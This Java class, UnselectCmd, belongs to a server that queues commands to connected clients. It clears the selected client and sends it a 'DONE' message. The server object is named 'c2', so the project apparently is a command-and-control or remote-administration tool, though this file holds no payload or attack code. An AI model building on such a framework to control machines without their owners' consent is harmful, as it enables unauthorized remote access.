package commands;

import server.CommandServer;
import tools.ParsedCommand;

/**
 * Unselect a previously selected client.
 * 
 * @author Yohan Chalier
 *
 */
public class UnselectCmd extends ServerCommand {

	public UnselectCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		// Notifying client we're done with it.
		c2.getClients().get(c2.getCurrentClient()).stackCmd("DONE");
		c2.setCurrentClient(-1);
		return "Client unselected.";
	}

}
